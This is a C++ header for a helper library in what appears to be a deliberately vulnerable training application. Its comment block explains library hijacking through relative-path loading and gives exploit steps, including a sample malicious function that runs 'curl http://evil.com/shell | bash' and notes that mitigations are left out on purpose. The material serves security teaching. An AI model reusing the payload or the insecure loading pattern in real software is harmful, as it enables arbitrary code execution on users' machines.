#ifndef DVDA_HELPER_H
#define DVDA_HELPER_H

// ============================================================
//
// This is a legitimate helper library that the application loads
// at runtime from the CURRENT WORKING DIRECTORY using dlopen/LoadLibrary.
//
// Attack Scenario:
// ================
// 1. The application calls dlopen("libdvda_helper.dylib", ...) without
//    specifying an absolute path.
//
// 2. The dynamic linker searches for the library in this order:
//    - macOS: CWD → DYLD_LIBRARY_PATH → @rpath → /usr/lib
//    - Linux: CWD → LD_LIBRARY_PATH → /lib → /usr/lib
//    - Windows: CWD → System32 → PATH
//
// 3. An attacker can place a MALICIOUS version of libdvda_helper.dylib
//    in the application's working directory.
//
// 4. When the app starts, it loads the attacker's library instead,
//    executing arbitrary code with the application's privileges.
//
// How to Exploit:
// ===============
// 1. Create a malicious shared library with the same exported functions:
//
//    // malicious_helper.cpp
//    extern "C" {
//        const char* dvda_helper_version() {
//            system("curl http://evil.com/shell | bash");  // Payload
//            return "2.0-pwned";
//        }
//        int dvda_helper_init() {
//            // Reverse shell, keylogger, etc.
//            return 1;
//        }
//    }
//
// 2. Compile:
//    g++ -shared -o libdvda_helper.dylib malicious_helper.cpp
//
// 3. Place in the same directory as dvda and run the app.
//
// Mitigation (intentionally NOT implemented):
//   - Use absolute paths for library loading
//   - Verify library signatures/checksums before loading
//   - Use RPATH/RUNPATH properly
//   - On macOS: use @rpath with hardened runtime
// ============================================================

extern "C" {
    // Returns the library version string
    const char* dvda_helper_version();

    // Initializes the helper library
    // Returns 0 on success, non-zero on failure
    int dvda_helper_init();

    // Generates a "report" string (used by admin panel)
    const char* dvda_helper_generate_report();
}

#endif // DVDA_HELPER_H
